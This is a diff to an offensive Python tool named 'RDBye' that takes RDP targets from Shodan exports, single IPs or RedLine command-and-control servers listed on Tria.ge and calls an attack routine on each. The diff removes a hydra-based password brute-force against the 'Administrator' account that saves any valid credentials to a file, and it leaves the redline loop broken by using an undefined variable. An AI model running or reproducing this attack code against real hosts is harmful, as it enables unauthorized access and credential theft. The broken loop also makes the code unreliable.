@@ -27,28 +27,6 @@ def print_header():
     f = Figlet(font=possible_fonts[random.randint(0, len(possible_fonts) - 1)])
     print(f.renderText("RDBye"))
     
-    
-def bruteforce(server, username):
-    print("Starting brute-force attack against " + server + " with username " + username)
-    p = subprocess.Popen("hydra -t 4 -l " + username + " -P ./passwords.txt rdp://" + server, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, shell=True)
-    (output, err) = p.communicate()  
-
-    #This makes the wait possible
-    p_status = p.wait()
-
-    #This will give you the output of the command being executed
-    password_found = False
-    line_counter = 0
-    output_lines = output.decode("utf-8").split("\n")
-    for line in output_lines:
-        if "1 valid password found" in line:
-            print("Valid password found!\n" + output_lines[line_counter - 1])
-            password_found = True
-            with open("valid_credentials.txt", "a+") as output:
-                output.write("Valid password found for " + server + "!\n" + output_lines[line_counter - 1] + "\n")
-        line_counter += 1
-    return password_found
-    
 
 def attack(ip):
     try:
@@ -140,7 +118,6 @@ parser = argparse.ArgumentParser(
 parser.add_argument('-s', '--shodan', help='JSON file exported from shodan.io')     
 parser.add_argument('-i', '--ip_address', help='Single IP address as target')  
 parser.add_argument('-r', '--redline', help='Downloaddd Redline Command & Control servers from Tria.ge (API key required)', action='store_true')
-parser.add_argument('-b', '--bruteforce', help='Try a predefined set of passwords against the target with username "Administrator"', action='store_true')
 
 args = parser.parse_args()
 if args.shodan:
@@ -164,18 +141,10 @@ if args.shodan:
         random.shuffle(ip_addresses)
 
         for ip in ip_addresses:
-            password_found = False
-            if args.bruteforce:
-                password_found = bruteforce(ip, "Administrator")
-            if not password_found:   
-                attack(ip)  
+            attack(ip)  
              
-elif args.ip_address:
-    password_found = False
-    if args.bruteforce:
-        password_found = bruteforce(args.ip_address, "Administrator")
-    if not password_found:        
-        attack(args.ip_address)
+elif args.ip_address:      
+    attack(args.ip_address)
     
 elif args.redline:
     if triage_api_key == "":
@@ -208,12 +177,7 @@ elif args.redline:
     print("Extracted " + str(len(C2s)) + " from Tria.ge!")
     
     for c2 in C2s:
-        password_found = False
-        server = c2.split(":")[0]
-        if args.bruteforce:
-            password_found = bruteforce(server, "Administrator")
-        if not password_found:        
-            attack(server)
+        attack(server)
 
 else:
     parser.print_help()    
